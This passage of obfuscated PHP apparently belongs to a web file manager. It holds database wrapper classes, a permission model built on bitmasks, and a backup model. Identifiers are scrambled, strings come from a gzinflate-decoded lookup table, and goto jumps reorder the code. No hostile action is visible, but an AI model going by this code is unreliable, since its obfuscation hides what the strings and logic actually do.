$_SERVER[Ù×¯Ø…]; if (0 === stripos($˜‡Š„Û©, $Ÿ¬Æšîù[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˜‡Š„Û©; if ($this->queryID) { $this->free(); } think_action_status($Ÿ¬Æšîù[19], 1); think_status($Ÿ¬Æšîù[20]); $this->queryID = mysql_query($˜‡Š„Û©, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($úô×âğ) { $âÏëšŠà =& $_SERVER[Ù×¯Ø…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $úô×âğ; if ($this->queryID) { $this->free(); } think_action_status($âÏëšŠà[21], 1); think_status($âÏëšŠà[20]); $Û»ÉÔûç = mysql_query($úô×âğ, $this->_linkID); $this->debug(); if (!1 === $Û»ÉÔûç) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ù×¯Ø…][893], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÂëÕüíĞ = mysql_query($_SERVER[Ù×¯Ø…][894], $this->_linkID); $this->transTimes = 0; if (!$ÂëÕüíĞ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $÷¹û¥ ß = mysql_query($_SERVER[Ù×¯Ø…][895], $this->_linkID); $this->transTimes = 0; if (!$÷¹û¥ ß) { $this->error(); return !1; } } return !0; } private function getAll() { $÷¦Ò´ÊÚ = array(); if ($this->numRows > 0) { while ($òÄ¬»²ª = mysql_fetch_assoc($this->queryID)) { $÷¦Ò´ÊÚ[] = $òÄ¬»²ª; } mysql_data_seek($this->queryID, 0); } return $÷¦Ò´ÊÚ; } public function getFields($ÌŠôâÛ) { $ş¥­´º¡ =& $_SERVER[Ù×¯Ø…]; $—ªµä®Ê = $this->query($ş¥­´º¡[896] . $this->parseKey($ÌŠôâÛ)); $¦áµ¯Ğ = array(); if ($—ªµä®Ê) { foreach ($—ªµä®Ê as $ÓåÃÌİ => $¶¾«ÇŒû) { $¦áµ¯Ğ[$¶¾«ÇŒû[$ş¥­´º¡[27]]] = array($ş¥­´º¡[28] => $¶¾«ÇŒû[$ş¥­´º¡[27]], $ş¥­´º¡[29] => $¶¾«ÇŒû[$ş¥­´º¡[30]], $ş¥­´º¡[31] => (bool) (strtoupper($¶¾«ÇŒû[$ş¥­´º¡[32]]) === $ş¥­´º¡[897]), $ş¥­´º¡[34] => $¶¾«ÇŒû[$ş¥­´º¡[35]], $ş¥­´º¡[36] => strtolower($¶¾«ÇŒû[$ş¥­´º¡[37]]) == $ş¥­´º¡[38], $ş¥­´º¡[39] => strtolower($¶¾«ÇŒû[$ş¥­´º¡[40]]) == $ş¥­´º¡[41]); } } return $¦áµ¯Ğ; } public function getTables($îğ´¬ë÷ = '') { $âÀè½á =& $_SERVER[Ù×¯Ø…]; if (!empty($îğ´¬ë÷)) { $„¿ƒêøé = $âÀè½á[898] . $îğ´¬ë÷ . $âÀè½á[899]; } else { $„¿ƒêøé = $âÀè½á[900]; } $ñ­Şüë› = $this->query($„¿ƒêøé); $Òëä¦ÕÆ = array(); foreach ($ñ­Şüë› as $¤¡÷ÄÒ => $‰Œì®¼) { $Òëä¦ÕÆ[$¤¡÷ÄÒ] = current($‰Œì®¼); } return $Òëä¦ÕÆ; } public function replace($¾¹Ä¸Ó, $°îÛ¤ë© = array()) { $•¸¢íÔ— =& $_SERVER[Ù×¯Ø…]; foreach ($¾¹Ä¸Ó as $··´Á‘‰ => $½Ô’Ìë¢) { $«€ó· » = $this->parseValue($½Ô’Ìë¢); if (is_scalar($«€ó· »)) { $©ÏÀˆ˜Ş[] = $«€ó· »; $Š•‹ÒËä[] = $this->parseKey($··´Á‘‰); } } $¶Ø‰‘©Â = $•¸¢íÔ—[901] . $this->parseTable($°îÛ¤ë©[$•¸¢íÔ—[277]]) . $•¸¢íÔ—[902] . implode($•¸¢íÔ—[47], $Š•‹ÒËä) . $•¸¢íÔ—[903] . implode($•¸¢íÔ—[47], $©ÏÀˆ˜Ş) . $•¸¢íÔ—[904]; return $this->execute($¶Ø‰‘©Â); } public function insertAll($ÚÄ½¯´À, $ï´ªÅíÈ = array(), $˜‡¥âíŠ = false) { $éû„ığ =& $_SERVER[Ù×¯Ø…]; if (!is_array($ÚÄ½¯´À[0])) { return !1; } $±í¯£ƒ = array_keys($ÚÄ½¯´À[0]); $şêãÕ©² = array(); foreach ($ÚÄ½¯´À as $¹¾ÙÛ¿) { $¹êé¨ÜÆ = array(); foreach ($¹¾ÙÛ¿ as $ä«óİìñ => $Ï†Ø¾¢) { $Ï†Ø¾¢ = $this->parseValue($Ï†Ø¾¢); if (is_scalar($Ï†Ø¾¢)) { $¹êé¨ÜÆ[] = $Ï†Ø¾¢; } } $şêãÕ©²[] = $éû„ığ[258] . implode($éû„ığ[47], $¹êé¨ÜÆ) . $éû„ığ[904]; } array_walk($±í¯£ƒ, array($this, $éû„ığ[905])); $ª“ĞÅ‚ = ($˜‡¥âíŠ ? $éû„ığ[906] : $éû„ığ[907]) . $éû„ığ[908] . $this->parseTable($ï´ªÅíÈ[$éû„ığ[277]]) . $éû„ığ[902] . implode($éû„ığ[47], $±í¯£ƒ) . $éû„ığ[909] . implode($éû„ığ[47], $şêãÕ©²); return $this->execute($ª“ĞÅ‚); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ĞÍˆÑŸ =& $_SERVER[Ù×¯Ø…]; $this->error = mysql_errno() . $ĞÍˆÑŸ[4] . mysql_error($this->_linkID); if ($ĞÍˆÑŸ[33] != $this->queryStr) { $this->error .= LNG($ĞÍˆÑŸ[45]) . $this->queryStr; } think_trace($this->error, $ĞÍˆÑŸ[33], $ĞÍˆÑŸ[46]); return $this->error; } public function escapeString($óÚÉ¸½») { if ($this->_linkID) { return mysql_real_escape_string($óÚÉ¸½», $this->_linkID); } else { return mysql_escape_string($óÚÉ¸½»); } } public function parseKey(&$Å˜¡Áİé, $ ù¬áãï = true) { $¦õÃóË¥ =& $_SERVER[Ù×¯Ø…]; if ($ ù¬áãï) { $Å˜¡Áİé = $this->parseKeyCheck($Å˜¡Áİé); } if ($Å˜¡Áİé != $¦õÃóË¥[182] && !preg_match($¦õÃóË¥[910], $Å˜¡Áİé)) { $Å˜¡Áİé = $¦õÃóË¥[383] . trim($Å˜¡Áİé, $¦õÃóË¥[383]) . $¦õÃóË¥[383]; } return $Å˜¡Áİé; } } class DbMysqli extends Db { public function __construct($´”ïñÉŸ = '') { $Ÿğğ”é =& $_SERVER[Ù×¯Ø…]; if (!extension_loaded($Ÿğğ”é[799])) { think_exception(think_lang($Ÿğğ”é[10]) . $Ÿğğ”é[911]); } if (!empty($´”ïñÉŸ)) { $this->config = $´”ïñÉŸ; if (empty($this->config[$Ÿğğ”é[13]])) { $this->config[$Ÿğğ”é[13]] = $Ÿğğ”é[33]; } } } public function connect($ê‚ÜÚãá = '', $ì©Œ•Ê = 0) { $Èıô‡È¾ =& $_SERVER[Ù×¯Ø…]; if (!isset($this->linkID[$ì©Œ•Ê])) { if (empty($ê‚ÜÚãá)) { $ê‚ÜÚãá = $this->config; } $this->linkID[$ì©Œ•Ê] = new mysqli($ê‚ÜÚãá[$Èıô‡È¾[885]], $ê‚ÜÚãá[$Èıô‡È¾[887]], $ê‚ÜÚãá[$Èıô‡È¾[888]], $ê‚ÜÚãá[$Èıô‡È¾[17]], $ê‚ÜÚãá[$Èıô‡È¾[886]] ? intval($ê‚ÜÚãá[$Èıô‡È¾[886]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ê‰ëÌ = $this->linkID[$ì©Œ•Ê]->server_version; $this->linkID[$ì©Œ•Ê]->query($Èıô‡È¾[889] . think_config($Èıô‡È¾[890]) . $Èıô‡È¾[55]); if ($ê‰ëÌ > $Èıô‡È¾[891]) { $this->linkID[$ì©Œ•Ê]->query($Èıô‡È¾[892]); } $this->connected = !0; if (1 != think_config($Èıô‡È¾[18])) { unset($this->config); } } return $this->linkID[$ì©Œ•Ê]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ü÷Ñ‘Ûˆ) { $º“ì¿‡’ =& $_SERVER[Ù×¯Ø…]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ü÷Ñ‘Ûˆ; if ($this->queryID) { $this->free(); } think_action_status($º“ì¿‡’[19], 1); think_status($º“ì¿‡’[20]); $this->queryID = $this->_linkID->query($Ü÷Ñ‘Ûˆ); if ($this->_linkID->more_results()) { while (($±ÜÈ±Øè = $this->_linkID->next_result()) != NULL) { $±ÜÈ±Øè->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($®ì¥İë) { $®‰È†Ä¡ =& $_SERVER[Ù×¯Ø…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $®ì¥İë; if ($this->queryID) { $this->free(); } think_action_status($®‰È†Ä¡[21], 1); think_status($®‰È†Ä¡[20]); $–Î“«Üó = $this->_linkID->query($®ì¥İë); $this->debug(); if (!1 === $–Î“«Üó) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ƒº¾”ÊÅ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ƒº¾”ÊÅ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Àà³Ä¿ö = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Àà³Ä¿ö) { $this->error(); return !1; } } return !0; } private function getAll() { $æµ®¹“õ = array(); if ($this->numRows > 0) { for ($ø•Ó½Åº = 0; $ø•Ó½Åº < $this->numRows; $ø•Ó½Åº++) { $æµ®¹“õ[$ø•Ó½Åº] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $æµ®¹“õ; } public function getFields($ŒØ‹ˆµà) { $³ñÀÑ  =& $_SERVER[Ù×¯Ø…]; $’åï¦† = $this->query($³ñÀÑ [896] . $this->parseKey($ŒØ‹ˆµà)); $Û§åéÂ = array(); if ($’åï¦†) { foreach ($’åï¦† as $ô§áè => $çŞš»Ì) { $Û§åéÂ[$çŞš»Ì[$³ñÀÑ [27]]] = array($³ñÀÑ [28] => $çŞš»Ì[$³ñÀÑ [27]], $³ñÀÑ [29] => $çŞš»Ì[$³ñÀÑ [30]], $³ñÀÑ [31] => (bool) ($çŞš»Ì[$³ñÀÑ [32]] === $³ñÀÑ [33]), $³ñÀÑ [34] => $çŞš»Ì[$³ñÀÑ [35]], $³ñÀÑ [36] => strtolower($çŞš»Ì[$³ñÀÑ [37]]) == $³ñÀÑ [38], $³ñÀÑ [39] => strtolower($çŞš»Ì[$³ñÀÑ [40]]) == $³ñÀÑ [41]); } } return $Û§åéÂ; } public function getTables($ƒÊ¼ÃÊ = '') { $Ş¤´ô«š =& $_SERVER[Ù×¯Ø…]; $úåıÓÎ = !empty($ƒÊ¼ÃÊ) ? $Ş¤´ô«š[898] . $ƒÊ¼ÃÊ . $Ş¤´ô«š[899] : $Ş¤´ô«š[900]; $€â¡Ã¡â = $this->query($úåıÓÎ); $ÁµÆÊØÙ = array(); if ($€â¡Ã¡â) { foreach ($€â¡Ã¡â as $…ø†ÉÃó => $„³„•Ò) { $ÁµÆÊØÙ[$…ø†ÉÃó] = current($„³„•Ò); } } return $ÁµÆÊØÙ; } public function replace($û°˜‰³Î, $‹ˆ¸ıÂ = array()) { $¡ËÀ€ó€ =& $_SERVER[Ù×¯Ø…]; foreach ($û°˜‰³Î as $áˆÒÁÄğ => $»ß‰Ş›ş) { $¼é¶ãåÒ = $this->parseValue($»ß‰Ş›ş); if (is_scalar($¼é¶ãåÒ)) { $’§øƒÜİ[] = $¼é¶ãåÒ; $ĞÆÙü¥ê[] = $this->parseKey($áˆÒÁÄğ); } } $¯€ìêß¡ = $¡ËÀ€ó€[901] . $this->parseTable($‹ˆ¸ıÂ[$¡ËÀ€ó€[277]]) . $¡ËÀ€ó€[902] . implode($¡ËÀ€ó€[47], $ĞÆÙü¥ê) . $¡ËÀ€ó€[903] . implode($¡ËÀ€ó€[47], $’§øƒÜİ) . $¡ËÀ€ó€[904]; return $this->execute($¯€ìêß¡); } public function insertAll($’Ï·ÌøÌ, $ÈÛªÎÆ = array(), $†ÖóšºÄ = false) { $Ñ¦µ×ï =& $_SERVER[Ù×¯Ø…]; if (!is_array($’Ï·ÌøÌ[0])) { return !1; } $µóÔÀÎó = array_keys($’Ï·ÌøÌ[0]); $¬Å– É = array(); foreach ($’Ï·ÌøÌ as $¯«“À§·) { $É‘çôó² = array(); foreach ($¯«“À§· as $Ùì½ò => $ç®‚éÎ”) { $ç®‚éÎ” = $this->parseValue($ç®‚éÎ”); if (is_scalar($ç®‚éÎ”)) { $É‘çôó²[] = $ç®‚éÎ”; } } $¬Å– É[] = $Ñ¦µ×ï[258] . implode($Ñ¦µ×ï[47], $É‘çôó²) . $Ñ¦µ×ï[904]; } array_walk($µóÔÀÎó, array($this, $Ñ¦µ×ï[905])); $‘Õ°°ÓĞ = $†ÖóšºÄ ? $Ñ¦µ×ï[906] : $Ñ¦µ×ï[907]; $ú‘§×ú = $‘Õ°°ÓĞ . $Ñ¦µ×ï[908] . $this->parseTable($ÈÛªÎÆ[$Ñ¦µ×ï[277]]) . $Ñ¦µ×ï[902] . implode($Ñ¦µ×ï[47], $µóÔÀÎó) . $Ñ¦µ×ï[909] . implode($Ñ¦µ×ï[47], $¬Å– É); return $this->execute($ú‘§×ú); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $•°Ñ¤¢¢ =& $_SERVER[Ù×¯Ø…]; $this->error = $this->_linkID->errno . $•°Ñ¤¢¢[4] . $this->_linkID->error; if ($•°Ñ¤¢¢[33] != $this->queryStr) { $this->error .= LNG($•°Ñ¤¢¢[45]) . $this->queryStr; } think_trace($this->error, $•°Ñ¤¢¢[33], $•°Ñ¤¢¢[46]); return $this->error; } public function escapeString($è“Ëû—µ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($è“Ëû—µ); } else { return addslashes($è“Ëû—µ); } } public function parseKey(&$­Ø´âÏÉ, $ì–ñ‚À¥ = true) { $šğ½¢²æ =& $_SERVER[Ù×¯Ø…]; if ($ì–ñ‚À¥) { $­Ø´âÏÉ = $this->parseKeyCheck($­Ø´âÏÉ); } if ($­Ø´âÏÉ != $šğ½¢²æ[182] && !preg_match($šğ½¢²æ[910], $­Ø´âÏÉ)) { $­Ø´âÏÉ = $šğ½¢²æ[383] . trim($­Ø´âÏÉ, $šğ½¢²æ[383]) . $šğ½¢²æ[383]; } return $­Ø´âÏÉ; } } goto a¿øåâŒ˜å; C…õ³‡Ñ: define($_SERVER[Ù×¯Ø…][0], $_SERVER[Ù×¯Ø…][1]); $_SERVER[ÓÖ³òÒ] = explode($_SERVER[Ù×¯Ø…][2], gzinflate(substr($_SERVER[Ù×¯Ø…][3], 10, -8))); function binCheckEq($À½–“‚ô, $Î»ı˜É) { return $À½–“‚ô == $Î»ı˜É; } goto BÛµìà°ôÜ; c’‚æØšß¶: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $’‚Í…ş =& $_SERVER[Ù×¯Ø…]; $æÂæù¹‚ = array(array($’‚Í…ş[424] => LNG($’‚Í…ş[1749]), $’‚Í…ş[1750] => $’‚Í…ş[1751], $’‚Í…ş[1752] => 1, $’‚Í…ş[1753] => 1, $’‚Í…ş[1754] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($’‚Í…ş[424] => LNG($’‚Í…ş[1755]), $’‚Í…ş[1750] => $’‚Í…ş[1756], $’‚Í…ş[1752] => 2, $’‚Í…ş[1753] => 1, $’‚Í…ş[1754] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($’‚Í…ş[424] => LNG($’‚Í…ş[1757]), $’‚Í…ş[1750] => $’‚Í…ş[1758], $’‚Í…ş[1752] => 3, $’‚Í…ş[1753] => 1, $’‚Í…ş[1754] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($’‚Í…ş[424] => LNG($’‚Í…ş[1759]), $’‚Í…ş[1750] => $’‚Í…ş[1760], $’‚Í…ş[1752] => 4, $’‚Í…ş[1753] => 1, $’‚Í…ş[1754] => self::AUTH_SHOW | self::AUTH_VIEW), array($’‚Í…ş[424] => LNG($’‚Í…ş[1761]), $’‚Í…ş[1750] => $’‚Í…ş[1762], $’‚Í…ş[1752] => 5, $’‚Í…ş[1753] => 1, $’‚Í…ş[1754] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($’‚Í…ş[424] => LNG($’‚Í…ş[1763]), $’‚Í…ş[1750] => $’‚Í…ş[1764], $’‚Í…ş[1752] => 6, $’‚Í…ş[1753] => 1, $’‚Í…ş[1754] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($’‚Í…ş[424] => LNG($’‚Í…ş[1765]), $’‚Í…ş[1750] => $’‚Í…ş[1766], $’‚Í…ş[1752] => 7, $’‚Í…ş[1753] => 1, $’‚Í…ş[1754] => 0)); return $æÂæù¹‚; } public static function authCheck($±ãé˜æü, $¥ö°©ö) { $±ãé˜æü = intval($±ãé˜æü); if ($GLOBALS[$_SERVER[Ù×¯Ø…][508]]) { return !0; } if ($±ãé˜æü <= 0) { return !1; } if (($±ãé˜æü & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($±ãé˜æü & $¥ö°©ö); } public static function authCheckShow($Å·å„§Ê) { return self::authCheck($Å·å„§Ê, self::AUTH_SHOW); } public static function authCheckView($Û§óÖ¨) { return self::authCheck($Û§óÖ¨, self::AUTH_VIEW); } public static function authCheckDownload($®’ãÊÌ°) { return self::authCheck($®’ãÊÌ°, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ˆ²¯Õ¬) { return self::authCheck($ˆ²¯Õ¬, self::AUTH_UPLOAD); } public static function authCheckEdit($Ñ÷èâÉû) { return self::authCheck($Ñ÷èâÉû, self::AUTH_EDIT); } public static function authCheckRemove($÷ñÍ¶±ï) { return self::authCheck($÷ñÍ¶±ï, self::AUTH_REMOVE); } public static function authCheckShare($Ä»¤µ©à) { return self::authCheck($Ä»¤µ©à, self::AUTH_SHARE); } public static function authCheckComment($˜Ã–æ¸°) { return self::authCheck($˜Ã–æ¸°, self::AUTH_COMMENT); } public static function authCheckEvent($©È«£) { return self::authCheck($©È«£, self::AUTH_EVENT); } public static function authCheckRoot($®À±Œ’) { return self::authCheck($®À±Œ’, self::AUTH_ROOT); } public static function authCheckAction($Æ®Ş€Å‡, $âœÈ£— ) { $ŞÏØƒ×ó =& $_SERVER[Ù×¯Ø…]; $“Âêë¬º = array($ŞÏØƒ×ó[1767] => self::AUTH_VIEW, $ŞÏØƒ×ó[1129] => self::AUTH_DOWNLOAD, $ŞÏØƒ×ó[107] => self::AUTH_UPLOAD, $ŞÏØƒ×ó[1717] => self::AUTH_EDIT, $ŞÏØƒ×ó[1716] => self::AUTH_REMOVE, $ŞÏØƒ×ó[1727] => self::AUTH_SHARE, $ŞÏØƒ×ó[352] => self::AUTH_COMMENT, $ŞÏØƒ×ó[1568] => self::AUTH_EVENT, $ŞÏØƒ×ó[1768] => self::AUTH_ROOT); if (!isset($“Âêë¬º[$âœÈ£— ])) { return; } $“ìÔÆš = $“Âêë¬º[$âœÈ£— ]; $Æ®Ş€Å‡ = intval($Æ®Ş€Å‡); if ($Æ®Ş€Å‡ <= 0) { return !1; } if (($Æ®Ş€Å‡ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Æ®Ş€Å‡ & $“ìÔÆš); } public static function authDisable($·Õ˜ò×Å, $Ù ²‹ü”) { if (intval($·Õ˜ò×Å) <= 0) { return 0; } return intval($·Õ˜ò×Å) & ~$Ù ²‹ü”; } public $optionType = "\x53\x79\x73\x74\145\155\x2e\x73\x6f\x75\x72\x63\x65\101\165\x74\x68\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\x75\164\x68", "\154\141\x62\145\x6c", "\144\x69\x73\160\x6c\141\x79", "\x73\171\x73\x74\145\155", "\x73\x6f\162\164"); public function initData() { $ƒõ€÷÷û = $this->authDefault(); foreach ($ƒõ€÷÷û as $ÆÃøõğş) { $this->add($ÆÃøõğş); } } public function findAuth($éÙ¤ïÈö, $ÍŒÑªáõ) { $ÃÆğ£ä° =& $_SERVER[Ù×¯Ø…]; $Ÿİ”€ôœ = parent::listData(); foreach ($Ÿİ”€ôœ as $ßØ€Œäç) { $ä²è’–Ò = intval($ßØ€Œäç[$ÃÆğ£ä°[417]]); if ($ä²è’–Ò <= 0 || $ßØ€Œäç[$ÃÆğ£ä°[1769]] == 0) { continue; } if (($ä²è’–Ò & $éÙ¤ïÈö) != $éÙ¤ïÈö) { continue; } if (($ä²è’–Ò & $ÍŒÑªáõ) != 0) { continue; } return $ßØ€Œäç[$ÃÆğ£ä°[395]]; } return !1; } public function findAuthReadOnly() { $ä¿¤Ùçö = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÌŒµ¡ª§ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ä¿¤Ùçö, $ÌŒµ¡ª§); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($’ŠÕ£âŠ = false, $®ì¯¦²õ = "\163\157\x72\164", $øÑğÁÑÆ = false) { return parent::listData($’ŠÕ£âŠ, $®ì¯¦²õ, $øÑğÁÑÆ); } public function update($’ú¬»½›, $¡÷¦ğ¸­) { $Ş©ÉØ›Æ =& $_SERVER[Ù×¯Ø…]; $ïÒ¨ê€¡ = parent::listData($’ú¬»½›); $úùšš…õ = $this->findByName($¡÷¦ğ¸­[$Ş©ÉØ›Æ[28]]); if (!$ïÒ¨ê€¡ || $úùšš…õ && $úùšš…õ[$Ş©ÉØ›Æ[395]] != $ïÒ¨ê€¡[$Ş©ÉØ›Æ[395]]) { return !1; } $this->filterAuth($¡÷¦ğ¸­[$Ş©ÉØ›Æ[417]]); return parent::update($’ú¬»½›, $¡÷¦ğ¸­); } public function remove($é™’ÚÜÖ) { $º¯„½’º = parent::listData($é™’ÚÜÖ); if (!$º¯„½’º || $º¯„½’º[$_SERVER[Ù×¯Ø…][1206]]) { return !1; } return parent::remove($é™’ÚÜÖ); } public function add($À÷ˆœÍè = array()) { $ªØÈ°ïõ =& $_SERVER[Ù×¯Ø…]; if ($this->findByName($À÷ˆœÍè[$ªØÈ°ïõ[28]])) { return !1; } $Çğ‡‹Š¼ = array($ªØÈ°ïõ[28] => $ªØÈ°ïõ[33], $ªØÈ°ïõ[417] => 1, $ªØÈ°ïõ[1770] => $ªØÈ°ïõ[1758], $ªØÈ°ïõ[1769] => 1, $ªØÈ°ïõ[1206] => 0, $ªØÈ°ïõ[1771] => 0); $À÷ˆœÍè = array_merge($Çğ‡‹Š¼, $À÷ˆœÍè); $À÷ˆœÍè[$ªØÈ°ïõ[1771]] = $this->getSort(); $this->filterAuth($À÷ˆœÍè[$ªØÈ°ïõ[417]]); return parent::insert($À÷ˆœÍè); } private function getSort() { $óæÅˆ± =& $_SERVER[Ù×¯Ø…]; $Õ Úƒ½§ = parent::listData(); $ÂÇóÑÚú = array_to_keyvalue($Õ Úƒ½§, $óæÅˆ±[33], $óæÅˆ±[1771]); return empty($ÂÇóÑÚú) ? 0 : max($ÂÇóÑÚú) + 1; } private function filterAuth(&$Ó´¾è¤) { if (!$Ó´¾è¤) { return; } $¯…î¯ôñ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $şùå†˜ = array(); foreach ($¯…î¯ôñ as $½²Ç‘µş) { if ($Ó´¾è¤ & $½²Ç‘µş) { $şùå†˜[] = $½²Ç‘µş; } } if (in_array(self::AUTH_ROOT, $şùå†˜)) { $Ó´¾è¤ = array_sum($¯…î¯ôñ); return; } $Ñ‰Ä¡Íğ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($şùå†˜ as $½²Ç‘µş) { if (isset($Ñ‰Ä¡Íğ[$½²Ç‘µş])) { $şùå†˜ = array_merge($şùå†˜, $Ñ‰Ä¡Íğ[$½²Ç‘µş]); } } $şùå†˜[] = self::AUTH_SHOW; $Ó´¾è¤ = array_sum(array_unique($şùå†˜)); } public function sort($ï‚•ê†™, $…¯Èâ´¨) { return parent::update($ï‚•ê†™, $…¯Èâ´¨); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\142\141\x63\153\x75\160\x4c\151\163\x74"; public $field = array("\151\x6f", "\156\141\x6d\145", "\x73\x74\141\164\x75\x73", "\x63\157\156\x74\145\x6e\164", "\155\x61\156\165\x61\x6c", "\162\145\x73\x75\x6c\164", "\164\151\x6d\145\106\162\x6f\x6d", "\164\151\155\145\124\157"); public function config() { $¦é¡Ôıí =& $_SERVER[Ù×¯Ø…]; $òÔÍ±Ó = Model($¦é¡Ôıí[769])->get($¦é¡Ôıí[781]); $òÔÍ±Ó = json_decode($òÔÍ±Ó, !0); $òÔÍ±Ó = is_array($òÔÍ±Ó) ? $òÔÍ±Ó : array(); if (!isset($òÔÍ±Ó[$¦é¡Ôıí[754]])) { $òÔÍ±Ó[$¦é¡Ôıí[754]] = $¦é¡Ôıí[87]; } unset($òÔÍ±Ó[$¦é¡Ôıí[1550]]); Action($¦é¡Ôıí[1772])->taskInit(); Model($¦é¡Ôıí[1549])->cacheClear(); $»¨š¾˜ = $¦é¡Ôıí[1773]; $İÔ¦ÚªÙ = Model($¦é¡Ôıí[1774])->findByKey($¦é¡Ôıí[1568], $»¨š¾˜); if (!$İÔ¦ÚªÙ) { $İÔ¦ÚªÙ = array(); } if (isset($İÔ¦ÚªÙ[$¦é¡Ôıí[197]])) { $İÔ¦ÚªÙ[$¦é¡Ôıí[197]] = json_decode($İÔ¦ÚªÙ[$¦é¡Ôıí[197]], !0); } if (isset($òÔÍ±Ó[$¦é¡Ôıí[197]])) { $İÔ¦ÚªÙ[$¦é¡Ôıí[197]][$¦é¡Ôıí[1553]] = $òÔÍ±Ó[$¦é¡Ôıí[197]]; unset($òÔÍ±Ó[$¦é¡Ôıí[197]]); } return array_merge($İÔ¦ÚªÙ, $òÔÍ±Ó); } public function listData($¬Å­¥×÷ = false, $È¡´ºÍû = "\x6d\x6f\x64\151\x66\x79\124\x69\x6d\x65", $Çê€¿Ì¶ = false) { return parent::listData($¬Å­¥×÷, $È¡´ºÍû, !0); } public function lastItem() { $…¿“î¯ü = $this->listData(); return !empty($…¿“î¯ü[0]) ? $…¿“î¯ü[0] : null; } public function kill($  ø—˜–) { $µâ—Å½ =& $_SERVER[Ù×¯Ø…]; $¿é¤¦¡Ö = $this->listData($  ø—˜–); if (!$¿é¤¦¡Ö || empty($¿é¤¦¡Ö[$µâ—Å½[28]])) { return !0; } Task::kill($µâ—Å½[780]); Task::kill($µâ—Å½[805]); Task::kill($µâ—Å½[815]); $áı‰É£Ã = $¿é¤¦¡Ö[$µâ—Å½[28]]; $û«—­°® = TEMP_FILES . $µâ—Å½[777] . $áı‰É£Ã . $µâ—Å½[8]; IO::remove($û«—­°®, !1); return $this->remove($  ø—˜–); } public function remove($ú®çıóŞ) { $Î‚Õôµ = $this->listData($ú®çıóŞ); if (!$Î‚Õôµ) { return !0; } return $this->backupRemove($Î‚Õôµ); } private function backupRemove($ƒöâëÃû) { parent::remove($ƒöâëÃû[$_SERVER[Ù×¯Ø…][395]]); 